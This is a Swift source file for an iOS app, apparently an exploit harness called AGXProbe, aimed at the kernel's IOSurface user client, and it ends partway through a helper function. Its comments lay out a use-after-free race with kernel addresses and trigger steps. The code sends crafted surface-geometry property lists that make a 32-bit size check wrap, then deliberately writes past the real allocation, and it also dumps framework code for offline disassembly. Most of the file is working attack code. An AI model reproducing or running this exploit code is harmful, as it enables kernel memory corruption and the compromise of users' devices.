// AGXProbe v121 - CVE-2026-112477 race harness with a working trigger
//
// v108 BREAKTHROUGH: IOSurfaceIncrementUseCount + IOSurfaceDecrementUseCount
// on a surface that carries a notify registration makes the kernel dispatch
// the notifications ("control msgs = 1").  That is the missing trigger:
// dispatchNotify walks the root-global list, so every node in it is visited,
// including a victim node whose client was already freed by IOServiceClose.
//
// v109 runs the real race:
//   1. threads call selector 0x11 (register) on a victim connection,
//      targeting surfaces from a private pool -> each success appends a node
//      to the root-global list whose +0x58 is the victim client,
//   2. the victim connection is closed -> teardown, and LAST unlinkByObject
//      removes that client's nodes,
//   3. the trigger (inc/dec use count on the control surface) dispatches ->
//      notifyOne(victim_client, node, ...) -> the freed client is locked and
//      dereferenced.
// A registration appended after unlinkByObject ran is still in the list at
// step 3: that is the UAF.
// Win signals: a message on the victim port (the read succeeded) or a panic
// in notifyOne (PAC/auth failure).  Read-or-panic, not kernel r/w.
//
// v100 design (kept):
//   * set-only threads (no removes), each thread walking a private slice of a
//     large surface pool, so every successful set is a fresh registration,
//   * TWO notify ports:
//       portD - registered through the framework's own client (control),
//       port  - registered only by the victim connections.
//
// Path under test (27.0.1 / 24A446):
//   selector 0x11 -> register(root, port, key, client)   0xfffffe000a3460f0
//   dispatchNotify(root, event)                          0xfffffe000a3462f0
//   notifyOne(client, node, event, idx)                  0xfffffe000a34ff48
//   unlinkByObject(root, client)                         0xfffffe000a346364  (LAST)
//   surface finalize                                     0xfffffe000a33c694

import SwiftUI
import Darwin
import Foundation
import CoreFoundation

@main
struct AGXProbeApp: App {
    var body: some Scene { WindowGroup { ContentView() } }
}

struct ContentView: View {
    @StateObject private var vm = ReachViewModel()
    var body: some View {
        VStack(spacing: 12) {
            Text("AGXProbe v121 - notify race").font(.headline)
            ScrollView {
                Text(vm.log)
                    .font(.system(size: 9, design: .monospaced))
                    .foregroundColor(.green)
                    .frame(maxWidth: .infinity, alignment: .leading)
                    .padding(6).background(Color.black.opacity(0.85)).cornerRadius(6)
            }
            Button(action: { Task { await vm.runRaceMode() } }) {
                Text(vm.isRunning ? "Running..." : "Run v121 race")
                    .font(.headline).foregroundColor(.white)
                    .frame(maxWidth: .infinity).padding(10)
                    .background(vm.isRunning ? Color.gray : Color.red).cornerRadius(8)
            }.disabled(vm.isRunning)
            Text("Status: \(vm.status)").font(.caption2).foregroundColor(.secondary)
            Spacer(minLength: 0)
        }
        .padding().task { await vm.autoRunIfRequested() }
    }
}

// ---- function shapes --------------------------------------------------------
typealias SetWrapFn = @convention(c) (UInt32, UInt32, UInt64, UnsafeRawPointer?, UInt32,
                                      UInt64, UInt64, UnsafeRawPointer?,
                                      UInt64, UInt64, UInt64, UInt64, UInt64) -> Int32
typealias RemWrapFn = @convention(c) (UInt32, UInt32, UInt64, UInt64, UnsafeRawPointer?,
                                      UInt64, UInt64, UInt64, UInt64, UInt64) -> Int32
typealias SetNotifyFn = @convention(c) (mach_port_t, UInt64, UInt64) -> kern_return_t
typealias RemoveNotifyFn = @convention(c) (UInt64) -> kern_return_t
typealias CreateFn = @convention(c) (CFDictionary) -> UnsafeMutableRawPointer?
typealias GetIDFn = @convention(c) (UnsafeMutableRawPointer) -> UInt32
typealias MethodFn = @convention(c) (UInt32, UInt32, UnsafePointer<UInt64>?, UInt32,
                                     UnsafeRawPointer?, Int,
                                     UnsafeMutablePointer<UInt64>?, UnsafeMutablePointer<UInt32>?,
                                     UnsafeMutableRawPointer?, UnsafeMutablePointer<UInt64>?) -> Int32

// ---- shared race context (touched from raw threads) -------------------------
final class RaceCtx {
    var conn: UInt32 = 0
    var stop: Int32 = 0
    var done: Int32 = 0
    var closing: Int32 = 0          // set right before IOServiceClose
    var closed: Int32 = 0           // set right after IOServiceClose returns
    var lateOK: Int = 0             // sets that completed while the teardown ran
    var afterOK: Int = 0            // sets that completed after the teardown
    var ops: Int = 0
    var okSet: Int = 0
    var errSet: Int = 0
    var lastErr: Int32 = 0
    var port: UInt32 = 0
    var ids: [UInt32] = []
    var victimIdx: UInt64 = 0      // key[2]: the notify index used by the node
    var tid: Int = 0
    var nthreads: Int = 1
    var setWrap: SetWrapFn? = nil
}

@MainActor
final class ReachViewModel: ObservableObject {
    @Published var log = ""
    @Published var status = "Ready"
    @Published var isRunning = false
    private var didAutoRun = false

    private let logFileURL: URL = {
        FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
            .appendingPathComponent("reach.log")
    }()

    private func emit(_ m: String) {
        log += m + "\n"; print(m); fflush(stdout)
        try? log.write(to: logFileURL, atomically: true, encoding: .utf8)
    }

    // During a race run the SwiftUI tree is not updated: a big @Published
    // string makes the graph re-render on every line, and the run already
    // crashed inside SwiftUI's update cycle (double free) that way.
    // The text goes to its own buffer so it still reaches the log file.
    private var quietUI = false
    private var raceBuf = ""
    private func emitRace(_ m: String) {
        raceBuf += m + "\n"
        print(m); fflush(stdout)
        try? raceBuf.write(to: logFileURL, atomically: true, encoding: .utf8)
    }

    func autoRunIfRequested() async {
        guard !didAutoRun else { return }
        didAutoRun = true
        let args = ProcessInfo.processInfo.arguments
        if args.contains("--dumpfw") { dumpFrameworkImage(); return }
        if args.contains("--geom") { await runGeomMode(); return }
        if args.contains("--race") { await runRaceMode(); return }
        if args.contains("--brotli") {
            emit("[br] CVE-2026-111497 repro, iOS " + ProcessInfo.processInfo.operatingSystemVersionString)
            let rc = BrotliRepro.run { self.emit($0) }
            emit("[br] rc=\(rc)")
            return
        }
        if args.contains("--autorun") { await runProbe() }
    }

    // ---- class-level IOKit helpers (shared by the modes) -------------------
    func krN(_ kr: Int32) -> String {
        switch UInt32(bitPattern: kr) {
        case 0: return "OK"
        case 0xe00002bd: return "NoMemory"
        case 0xe00002c1: return "BadMatching"
        case 0xe00002c2: return "BadArgument"
        case 0xe00002c9: return "Duplicate"
        case 0xe00002d8: return "NotAttached"
        default: return String(format: "0x%08x", UInt32(bitPattern: kr))
        }
    }

    private var _cmFn: MethodFn? = nil
    func callMethod(_ conn: UInt32, _ sel: UInt32,
                    _ scalars: UnsafePointer<UInt64>?, _ scalarCnt: UInt32,
                    _ structIn: UnsafeRawPointer?, _ structInSize: Int,
                    _ out: UnsafeMutableRawPointer?, _ outSize: inout UInt64) -> Int32 {
        if _cmFn == nil {
            guard let h = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_NOW),
                  let s = dlsym(h, "IOConnectCallMethod") else { return -1 }
            _cmFn = unsafeBitCast(s, to: MethodFn.self)
        }
        guard let f = _cmFn else { return -1 }
        return f(conn, sel, scalars, scalarCnt, structIn, structInSize,
                 nil, nil, out, &outSize)
    }

    // ---- drive IOSurfaceRoot directly with a serialized property list ------
    // Selector 0 (scalarIn=1, structIn=variable, structOut=0xc68) is the
    // create method of IOSurfaceRootUserClient.  Its parser honours the
    // private per-slice keys; libIOSurface strips them, which is why
    // IOSurfaceCreate never reaches the 32-bit (data+header)*sliceCount
    // multiply at 0xa32ccf8.  This probe drives the user client directly
    // with the SKVLENT/F1 dictionary (the shape the A16 transcript used).
    //
    // NOTE (13 Pro, iOS 27.0): the scalar input must be 0.  With scalar=len
    // or scalar=1 the kernel returns BadArgument; with scalar=0 the surface
    // is created.  (The earlier t8150 matrix never used the right shape.)
    func runGeomMode() async {
        isRunning = true; status = "Geom..."; log = ""
        quietUI = true
        raceBuf = ""
        try? "".write(to: logFileURL, atomically: true, encoding: .utf8)

        // ---- the IOSurfaceRoot service -------------------------------------
        var iter: io_iterator_t = 0
        let kr = xq_IOServiceGetMatchingServices(0, xq_IOServiceMatching("IOSurfaceRoot"), &iter)
        emitRace("matching kr=\(krN(kr))")
        guard kr == 0 else { status = "Complete"; isRunning = false; return }
        let svc = xq_IOIteratorNext(iter)
        emitRace("service = 0x\(String(svc, radix: 16))")
        var conn: io_connect_t = 0
        let ok = xq_IOServiceOpen(svc, mach_task_self(), 0, &conn)
        emitRace("IOServiceOpen type=0 kr=\(krN(ok)) conn=0x\(String(conn, radix: 16))")
        guard conn != 0 else { status = "Complete"; isRunning = false; return }

        // ---- control matrix -------------------------------------------------
        // The plane parser validates (data + header) * sliceCount in 32 bits
        // and compares the WRAPPED product against the allocation, while the
        // full 32-bit header value is stored.  So:
        //   A) wrapping product  -> must be ACCEPTED (size confusion)
        //   B) non-wrapping product larger than the allocation -> must be
        //      REJECTED (proves the parser really runs)
        //   C) no per-slice keys -> must be ACCEPTED (the block is skipped)
        struct Case { let name: String; let hdr: Int; let data: Int; let sc: Int; let alloc: Int; let keys: Bool }
        let cases: [Case] = [
            Case(name: "A wrap  hdr=0x40000000 data=0x4000 sc=4 alloc=0x10000", hdr: 0x40000000, data: 0x4000, sc: 4, alloc: 0x10000, keys: true),
            Case(name: "B nowrap hdr=0x4000 data=0x4000 sc=4 alloc=0x10000", hdr: 0x4000, data: 0x4000, sc: 4, alloc: 0x10000, keys: true),
            Case(name: "C nokeys hdr=0x4000 data=0x4000 sc=4 alloc=0x10000", hdr: 0x4000, data: 0x4000, sc: 4, alloc: 0x10000, keys: false),
            Case(name: "D wrap2 hdr=0x40000000 data=0x40000000 sc=4 alloc=0x10000", hdr: 0x40000000, data: 0x40000000, sc: 4, alloc: 0x10000, keys: true),
            Case(name: "E nowrap hdr=0x10000000 data=0x10000000 sc=1 alloc=0x10000", hdr: 0x10000000, data: 0x10000000, sc: 1, alloc: 0x10000, keys: true),
        ]

        for c in cases {
            let sliceKeys = c.keys ? "<key>IOSurfacePlaneDataRegionBytesPerSlice</key><integer>\(c.data)</integer><key>IOSurfacePlaneHeaderRegionBytesPerSlice</key><integer>\(c.hdr)</integer>" : ""
            let xml = """
            <?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
            <plist version="1.0"><dict><key>IOSurfaceWidth</key><integer>64</integer><key>IOSurfaceHeight</key><integer>64</integer><key>IOSurfaceBytesPerElement</key><integer>4</integer><key>IOSurfacePixelFormat</key><integer>1111970369</integer><key>IOSurfaceAllocSize</key><integer>\(c.alloc)</integer><key>IOSurfaceSliceCount</key><integer>\(c.sc)</integer><key>IOSurfacePlaneInfo</key><array><dict><key>IOSurfacePlaneWidth</key><integer>64</integer><key>IOSurfacePlaneHeight</key><integer>64</integer><key>IOSurfacePlaneBytesPerElement</key><integer>4</integer><key>IOSurfacePlaneBytesPerRow</key><integer>512</integer><key>IOSurfacePlaneSize</key><integer>\(c.alloc)</integer><key>IOSurfacePlaneCompressionType</key><integer>4</integer>\(sliceKeys)<key>IOSurfacePlaneCompressedTileWidth</key><integer>32</integer><key>IOSurfacePlaneCompressedTileHeight</key><integer>32</integer><key>IOSurfacePlaneBytesPerCompressedTileHeader</key><integer>8</integer><key>IOSurfacePlaneBytesPerTileData</key><integer>4096</integer><key>IOSurfacePlaneWidthInCompressedTiles</key><integer>2</integer><key>IOSurfacePlaneHeightInCompressedTiles</key><integer>2</integer><key>IOSurfacePlaneBytesPerRowOfTileData</key><integer>8192</integer><key>IOSurfacePlaneCompressedTileHeaderRegionOffset</key><integer>\(c.alloc)</integer><key>IOSurfacePlaneCompressedTileDataRegionOffset</key><integer>0</integer><key>IOSurfacePlaneBytesPerRowOfCompressedTileHeaderGroups</key><integer>0</integer></dict></array></dict></plist>
            """
            let payload = Array(xml.utf8) + [0]
            var out = [UInt8](repeating: 0, count: 0xc68)
            var outSizeU: UInt64 = 0xc68
            var sc0: [UInt64] = [0]
            let r: Int32 = sc0.withUnsafeMutableBufferPointer { sb in
                payload.withUnsafeBufferPointer { pb in
                    out.withUnsafeMutableBytes { ob in
                        callMethod(conn, 0, UnsafePointer(sb.baseAddress), 1,
                                   pb.baseAddress, payload.count,
                                   ob.baseAddress, &outSizeU)
                    }
                }
            }
            func u64(_ o: Int) -> UInt64 {
                guard o + 8 <= out.count else { return 0 }
                var v: UInt64 = 0
                for i in 0..<8 { v |= UInt64(out[o + i]) << (8 * i) }
                return v
            }
            var found = ""
            for o in stride(from: 0, to: 0xc68 - 8, by: 8) {
                let v = u64(o)
                if v == UInt64(c.hdr) || v == UInt64(c.data) {
                    found += " [hdr/data @0x\(String(o, radix: 16))]"
                }
            }
            let base = u64(0x00)
            let sid = u64(0x18) & 0xffffffff
            let alloc = u64(0x20)
            emitRace("\(c.name) -> kr=\(krN(r)) base=0x\(String(base, radix: 16)) id=\(sid) alloc=0x\(String(alloc, radix: 16)) planes=\(u64(0x58))\(found)")
        }
        func hexPtr(_ p: UnsafeMutableRawPointer?) -> String {
        guard let q = p else { return "nil" }
        return "0x" + String(UInt(bitPattern: q), radix: 16)
    }

    // ---- consumers of the bogus geometry --------------------------------
        // Does the kernel map the surface with the *claimed* size?  If a lock
        // succeeds and reports / maps a region far bigger than the 64 KiB
        // allocation, the user gets a window onto other pages.
        typealias LockFn2 = @convention(c) (UnsafeMutableRawPointer, UInt64, UnsafeMutableRawPointer?) -> Bool
        typealias UnlockFn2 = @convention(c) (UnsafeMutableRawPointer, UInt64, UnsafeMutableRawPointer?) -> Bool
        typealias GetAllocFn = @convention(c) (UnsafeMutableRawPointer) -> Int
        typealias GetBaseFn = @convention(c) (UnsafeMutableRawPointer) -> UnsafeMutableRawPointer?
        if let fw = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW) {
            let lockSym = dlsym(fw, "IOSurfaceLock")
            let unlockSym = dlsym(fw, "IOSurfaceUnlock")
            let allocSym = dlsym(fw, "IOSurfaceGetAllocSize")
            let baseSym = dlsym(fw, "IOSurfaceGetBaseAddress")
            let lookupSym = dlsym(fw, "IOSurfaceLookup")
            typealias LookupFn = @convention(c) (UInt32) -> UnsafeMutableRawPointer?
            emitRace("symbols: lock=\(lockSym != nil) unlock=\(unlockSym != nil) alloc=\(allocSym != nil) base=\(baseSym != nil) lookup=\(lookupSym != nil)")
            if let ls = lockSym, let us = unlockSym, let asy = allocSym, let bsy = baseSym, let lu = lookupSym {
                let lockFn = unsafeBitCast(ls, to: LockFn2.self)
                let unlockFn = unsafeBitCast(us, to: UnlockFn2.self)
                let allocFn = unsafeBitCast(asy, to: GetAllocFn.self)
                let baseFn = unsafeBitCast(bsy, to: GetBaseFn.self)
                let lookupFn = unsafeBitCast(lu, to: LookupFn.self)

                // (a) a plain surface, locked
                func makeXML(hdr: Int, data: Int, sc: Int, alloc: Int, sliceKeys: Bool, plain: Bool) -> [UInt8] {
                    let slice = sliceKeys ? "<key>IOSurfacePlaneDataRegionBytesPerSlice</key><integer>\(data)</integer><key>IOSurfacePlaneHeaderRegionBytesPerSlice</key><integer>\(hdr)</integer>" : ""
                    let comp = plain ? "" : "<key>IOSurfacePlaneCompressionType</key><integer>4</integer>\(slice)<key>IOSurfacePlaneCompressedTileWidth</key><integer>32</integer><key>IOSurfacePlaneCompressedTileHeight</key><integer>32</integer><key>IOSurfacePlaneBytesPerCompressedTileHeader</key><integer>8</integer><key>IOSurfacePlaneBytesPerTileData</key><integer>4096</integer><key>IOSurfacePlaneWidthInCompressedTiles</key><integer>2</integer><key>IOSurfacePlaneHeightInCompressedTiles</key><integer>2</integer><key>IOSurfacePlaneBytesPerRowOfTileData</key><integer>8192</integer><key>IOSurfacePlaneCompressedTileHeaderRegionOffset</key><integer>\(alloc)</integer><key>IOSurfacePlaneCompressedTileDataRegionOffset</key><integer>0</integer><key>IOSurfacePlaneBytesPerRowOfCompressedTileHeaderGroups</key><integer>0</integer>"
                    let xml = """
                    <?xml version="1.0" encoding="UTF-8"?>
                    <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
                    <plist version="1.0"><dict><key>IOSurfaceWidth</key><integer>64</integer><key>IOSurfaceHeight</key><integer>64</integer><key>IOSurfaceBytesPerElement</key><integer>4</integer><key>IOSurfacePixelFormat</key><integer>1111970369</integer><key>IOSurfaceAllocSize</key><integer>\(alloc)</integer><key>IOSurfaceSliceCount</key><integer>\(sc)</integer><key>IOSurfacePlaneInfo</key><array><dict><key>IOSurfacePlaneWidth</key><integer>64</integer><key>IOSurfacePlaneHeight</key><integer>64</integer><key>IOSurfacePlaneBytesPerElement</key><integer>4</integer><key>IOSurfacePlaneBytesPerRow</key><integer>512</integer><key>IOSurfacePlaneSize</key><integer>\(alloc)</integer>\(comp)</dict></array></dict></plist>
                    """
                    return Array(xml.utf8) + [0]
                }

                for (label, xml) in [("plain  alloc=0x10000", makeXML(hdr: 0, data: 0, sc: 1, alloc: 0x10000, sliceKeys: false, plain: true)),
                                     ("bogus  alloc=0x10000 hdr=0x40000000", makeXML(hdr: 0x40000000, data: 0x4000, sc: 4, alloc: 0x10000, sliceKeys: true, plain: false)),
                                     ("bogus2 alloc=0x10000 data=0x40000000", makeXML(hdr: 0x40000000, data: 0x40000000, sc: 4, alloc: 0x10000, sliceKeys: true, plain: false))] {
                    var out = [UInt8](repeating: 0, count: 0xc68)
                    var outSizeU: UInt64 = 0xc68
                    var sc0: [UInt64] = [0]
                    let r: Int32 = sc0.withUnsafeMutableBufferPointer { sb in
                        xml.withUnsafeBufferPointer { pb in
                            out.withUnsafeMutableBytes { ob in
                                callMethod(conn, 0, UnsafePointer(sb.baseAddress), 1,
                                           pb.baseAddress, xml.count,
                                           ob.baseAddress, &outSizeU)
                            }
                        }
                    }
                    guard r == 0 else { emitRace("\(label): create kr=\(krN(r))"); continue }
                    func u64(_ o: Int) -> UInt64 {
                        guard o + 8 <= out.count else { return 0 }
                        var v: UInt64 = 0
                        for i in 0..<8 { v |= UInt64(out[o + i]) << (8 * i) }
                        return v
                    }
                    let sid = UInt32(u64(0x18) & 0xffffffff)
                    let kbase = u64(0x00)
                    let kalloc = u64(0x20)
                    emitRace("\(label): created id=\(sid) base=0x\(String(kbase, radix: 16)) alloc=0x\(String(kalloc, radix: 16))")
                    if let s = lookupFn(sid) {
                        let realAlloc = allocFn(s)
                        let ub = baseFn(s)
                        emitRace("  IOSurfaceLookup -> allocSize=\(realAlloc) (0x\(String(UInt64(realAlloc), radix: 16))) base=\(hexPtr(ub))")
                        var lo: UInt64 = 0
                        let lk = lockFn(s, 0, &lo)
                        let ub2 = baseFn(s)
                        emitRace("  IOSurfaceLock -> \(lk) lockOptions=0x\(String(lo, radix: 16)) base=\(hexPtr(ub2))")
                        if lk {
                            _ = unlockFn(s, 0, &lo)
                            emitRace("  unlocked")
                        }
                    } else {
                        emitRace("  IOSurfaceLookup failed")
                    }
                }
            }
        }
        // ---- does the bogus geometry enlarge the USER mapping? ---------------
        // If the kernel maps the surface with the *claimed* per-slice size,
        // a user write just past the real allocation lands in mapped memory
        // (i.e. another object) instead of faulting.  That would be a direct
        // kernel OOB write, no GPU involved.
        typealias LockFn3 = @convention(c) (UnsafeMutableRawPointer, UInt64, UnsafeMutableRawPointer?) -> Bool
        typealias UnlockFn3 = @convention(c) (UnsafeMutableRawPointer, UInt64, UnsafeMutableRawPointer?) -> Bool
        typealias LookupFn3 = @convention(c) (UInt32) -> UnsafeMutableRawPointer?
        typealias GetBaseFn3 = @convention(c) (UnsafeMutableRawPointer) -> UnsafeMutableRawPointer?
        if let fw = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW),
           let ls = dlsym(fw, "IOSurfaceLock"),
           let us = dlsym(fw, "IOSurfaceUnlock"),
           let lu = dlsym(fw, "IOSurfaceLookup"),
           let bs = dlsym(fw, "IOSurfaceGetBaseAddress") {
            let lockFn = unsafeBitCast(ls, to: LockFn3.self)
            let unlockFn = unsafeBitCast(us, to: UnlockFn3.self)
            let lookupFn = unsafeBitCast(lu, to: LookupFn3.self)
            let baseFn = unsafeBitCast(bs, to: GetBaseFn3.self)

            func makeXML2(hdr: Int, data: Int, sc: Int, alloc: Int, bpr: Int, psize: Int, sliceKeys: Bool) -> [UInt8] {
                let slice = sliceKeys ? "<key>IOSurfacePlaneDataRegionBytesPerSlice</key><integer>\(data)</integer><key>IOSurfacePlaneHeaderRegionBytesPerSlice</key><integer>\(hdr)</integer>" : ""
                let comp = sliceKeys ? "<key>IOSurfacePlaneCompressionType</key><integer>4</integer>\(slice)<key>IOSurfacePlaneCompressedTileWidth</key><integer>32</integer><key>IOSurfacePlaneCompressedTileHeight</key><integer>32</integer><key>IOSurfacePlaneBytesPerCompressedTileHeader</key><integer>8</integer><key>IOSurfacePlaneBytesPerTileData</key><integer>4096</integer><key>IOSurfacePlaneWidthInCompressedTiles</key><integer>2</integer><key>IOSurfacePlaneHeightInCompressedTiles</key><integer>2</integer><key>IOSurfacePlaneBytesPerRowOfTileData</key><integer>8192</integer><key>IOSurfacePlaneCompressedTileHeaderRegionOffset</key><integer>\(alloc)</integer><key>IOSurfacePlaneCompressedTileDataRegionOffset</key><integer>0</integer><key>IOSurfacePlaneBytesPerRowOfCompressedTileHeaderGroups</key><integer>0</integer>" : ""
                let xml = """
                <?xml version="1.0" encoding="UTF-8"?>
                <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
                <plist version="1.0"><dict><key>IOSurfaceWidth</key><integer>64</integer><key>IOSurfaceHeight</key><integer>64</integer><key>IOSurfaceBytesPerElement</key><integer>4</integer><key>IOSurfacePixelFormat</key><integer>1111970369</integer><key>IOSurfaceAllocSize</key><integer>\(alloc)</integer><key>IOSurfaceSliceCount</key><integer>\(sc)</integer><key>IOSurfacePlaneInfo</key><array><dict><key>IOSurfacePlaneWidth</key><integer>64</integer><key>IOSurfacePlaneHeight</key><integer>64</integer><key>IOSurfacePlaneBytesPerElement</key><integer>4</integer><key>IOSurfacePlaneBytesPerRow</key><integer>\(bpr)</integer><key>IOSurfacePlaneSize</key><integer>\(psize)</integer>\(comp)</dict></array></dict></plist>
                """
                return Array(xml.utf8) + [0]
            }

            // (1) a self-consistent plain surface: alloc 0x4000, bpr 256, psize 0x4000
            // (2) the same plane but with the bogus per-slice geometry
            let variants: [(String, [UInt8])] = [
                ("plain  alloc=0x4000", makeXML2(hdr: 0, data: 0, sc: 1, alloc: 0x4000, bpr: 256, psize: 0x4000, sliceKeys: false)),
                ("bogus  alloc=0x4000 hdr=0x40000000 sc=4", makeXML2(hdr: 0x40000000, data: 0x4000, sc: 4, alloc: 0x4000, bpr: 256, psize: 0x4000, sliceKeys: true)),
            ]
            for (label, xml) in variants {
                var out = [UInt8](repeating: 0, count: 0xc68)
                var outSizeU: UInt64 = 0xc68
                var sc0: [UInt64] = [0]
                let r: Int32 = sc0.withUnsafeMutableBufferPointer { sb in
                    xml.withUnsafeBufferPointer { pb in
                        out.withUnsafeMutableBytes { ob in
                            callMethod(conn, 0, UnsafePointer(sb.baseAddress), 1,
                                       pb.baseAddress, xml.count,
                                       ob.baseAddress, &outSizeU)
                        }
                    }
                }
                guard r == 0 else { emitRace("\(label): create kr=\(krN(r))"); continue }
                func u64b(_ o: Int) -> UInt64 {
                    guard o + 8 <= out.count else { return 0 }
                    var v: UInt64 = 0
                    for i in 0..<8 { v |= UInt64(out[o + i]) << (8 * i) }
                    return v
                }
                let sid = UInt32(u64b(0x18) & 0xffffffff)
                emitRace("\(label): created id=\(sid) kbase=0x\(String(u64b(0x00), radix: 16)) alloc=0x\(String(u64b(0x20), radix: 16))")
                guard let s = lookupFn(sid) else { emitRace("  lookup failed"); continue }
                var lo: UInt64 = 0
                let lk = lockFn(s, 0, &lo)
                let ub = baseFn(s)
                emitRace("  lock=\(lk) base=\(hexPtr(ub)) lockOptions=0x\(String(lo, radix: 16))")
                guard lk, let b = ub else { continue }
                let realAlloc = 0x4000
                // sanity: write in bounds, read back
                b.assumingMemoryBound(to: UInt32.self).pointee = 0x5a5a5a5a
                emitRace("  in-bounds write ok, readback=0x\(String(b.assumingMemoryBound(to: UInt32.self).pointee, radix: 16))")
                // the probe: write just past the real allocation
                emitRace("  writing 0x11223344 at +0x\(String(realAlloc, radix: 16)) (one page past) ...")
                let oob = (b + realAlloc).assumingMemoryBound(to: UInt32.self)
                oob.pointee = 0x11223344
                emitRace("  *** OOB WRITE SURVIVED: the mapping is oversized ***")
                _ = unlockFn(s, 0, &lo)
            }
        }
        _ = xq_IOServiceClose(conn)
        status = "Complete"; isRunning = false
    }

    // ---- dump the mapped IOSurface framework image -------------------------
    // The framework lives in the dyld shared cache, but its dylib image is
    // mapped contiguously, so the in-memory bytes are the dylib file.  Dump
    // it so the create path (and its kernel ABI) can be disassembled offline.
    func dumpFrameworkImage() {
        isRunning = true; status = "Dumping..."; log = ""
        try? "".write(to: logFileURL, atomically: true, encoding: .utf8)
        guard let fw = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW),
              let sym = dlsym(fw, "IOSurfaceCreate") else {
            emit("[-] cannot resolve IOSurfaceCreate"); status = "Complete"; isRunning = false; return
        }
        var info = Dl_info()
        guard dladdr(sym, &info) != 0, let base = info.dli_fbase else {
            emit("[-] dladdr failed"); status = "Complete"; isRunning = false; return
        }
        emit("IOSurface base = 0x\(String(UInt(bitPattern: base), radix: 16))")

        // Mach-O 64 header
        let magic = base.load(as: UInt32.self)
        emit("magic = 0x\(String(magic, radix: 16))")
        guard magic == 0xfeedfacf else { emit("[-] not mach-o 64"); status = "Complete"; isRunning = false; return }
        let ncmds = (base + 16).load(as: UInt32.self)
        let sizeofcmds = (base + 20).load(as: UInt32.self)
        emit("ncmds = \(ncmds)")
        var off: Int = 32
        var maxEnd: Int = 0
        var segs: [(String, Int, Int)] = []
        let baseInt = Int(bitPattern: base)
        for _ in 0..<ncmds {
            let cmd = (base + off).load(as: UInt32.self)
            let cmdsize = (base + off + 4).load(as: UInt32.self)
            if cmd == 0x19 { // LC_SEGMENT_64
                var name = ""
                for i in 0..<16 {
                    let c = (base + off + 8 + i).load(as: UInt8.self)
                    if c == 0 { break }
                    name.append(Character(UnicodeScalar(c)))
                }
                let vmaddr = Int((base + off + 24).load(as: UInt64.self))
                let vmsize = (base + off + 32).load(as: UInt64.self)
                let fileoff = Int((base + off + 40).load(as: UInt64.self))
                let filesize = (base + off + 48).load(as: UInt64.self)
                let end = vmaddr + Int(filesize) - baseInt
                if end > maxEnd { maxEnd = end }
                segs.append((name, vmaddr, fileoff))
                emit("  seg \(name) vm=0x\(String(vmaddr, radix: 16)) vmsize=0x\(String(vmsize, radix: 16)) fileoff=0x\(String(fileoff, radix: 16)) filesize=0x\(String(filesize, radix: 16))")
            }
            if cmdsize == 0 { break }
            off += Int(cmdsize)
        }
        emit("sizeofcmds = \(sizeofcmds)")
        // The shared cache lays the segments out far apart, so dump only the
        // __TEXT segment (the code) and report its vm address.
        guard let textSeg = segs.first(where: { $0.0 == "__TEXT" }) else {
            emit("[-] no __TEXT segment"); status = "Complete"; isRunning = false; return
        }
        let textBase = textSeg.1
        let textSize = (base + off).load(as: UInt32.self)   // placeholder, replaced below
        _ = textSize
        var textEnd = 0
        for (nm, vm, _fo) in segs where nm == "__TEXT" {
            // re-read the size for __TEXT
            textEnd = vm
        }
        // recompute __TEXT filesize by scanning the load commands again
        var o2: Int = 32
        var tSize = 0
        for _ in 0..<ncmds {
            let cmd = (base + o2).load(as: UInt32.self)
            let cmdsize = (base + o2 + 4).load(as: UInt32.self)
            if cmd == 0x19 {
                var name = ""
                for i in 0..<16 {
                    let c = (base + o2 + 8 + i).load(as: UInt8.self)
                    if c == 0 { break }
                    name.append(Character(UnicodeScalar(c)))
                }
                if name == "__TEXT" {
                    tSize = Int((base + o2 + 48).load(as: UInt64.self))
                }
            }
            if cmdsize == 0 { break }
            o2 += Int(cmdsize)
        }
        emit("__TEXT vm=0x\(String(textBase, radix: 16)) size=0x\(String(tSize, radix: 16))")
        guard tSize > 0, tSize < 0x4000000 else {
            emit("[-] implausible __TEXT size"); status = "Complete"; isRunning = false; return
        }
        var data = Data(count: tSize)
        let textStart = UnsafeRawPointer(bitPattern: textBase)!
        data.withUnsafeMutableBytes { dst in
            dst.baseAddress?.copyMemory(from: textStart, byteCount: tSize)
        }
        let out = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
            .appendingPathComponent("iosurface_text.bin")
        do {
            try data.write(to: out)
            emit("wrote \(out.path) (\(data.count) bytes, base 0x\(String(textBase, radix: 16)))")
        } catch {
            emit("[-] write failed: \(error)")
        }
        status = "Complete"; isRunning = false
    }

    // ---- tiny arm64 helpers --------------------------------------------------
    func read32(_ addr: UInt64) -> UInt32? {
        guard let p = UnsafeRawPointer(bitPattern: Int(bitPattern: UInt(truncatingIfNeeded: addr))) else { return nil }
        let b = p.assumingMemoryBound(to: UInt8.self)
        return UInt32(b[0]) | (UInt32(b[1]) << 8) | (UInt32(b[2]) << 16) | (UInt32(b[3]) << 24)
    }
    func hexbytes(_ addr: UInt64, _ n: Int) -> String {
        guard let p = UnsafeRawPointer(bitPattern: Int(bitPattern: UInt(truncatingIfNeeded: addr))) else { return "?" }
        let b = p.assumingMemoryBound(to: UInt8.self)
        var s = ""
        for i in 0..<n { s += String(format: "%02x ", b[i]) }
        return s
    }
    func blTarget(_ word: UInt32, _ pc: UInt64) -> UInt64 {
        var imm = Int64(word & 0x03FFFFFF)
        if (imm & 0x02000000) != 0 { imm -= 0x04000000 }
        return UInt64(bitPattern: Int64(pc) &+ (imm &* 4))
    }
    func stubTarget(_ adrp: UInt32, _ add: UInt32, _ pc: UInt64) -> UInt64 {
        let immhi = UInt64((adrp >> 5) & 0x7FFFF)
        let immlo = UInt64((adrp >> 29) & 0x3)
        var simm = Int64((immhi << 2) | immlo)
        if (simm & 0x100000) != 0 { simm -= 0x200000 }
        let page = (pc & ~UInt64(0xFFF)) &+ UInt64(bitPattern: simm &* 4096)
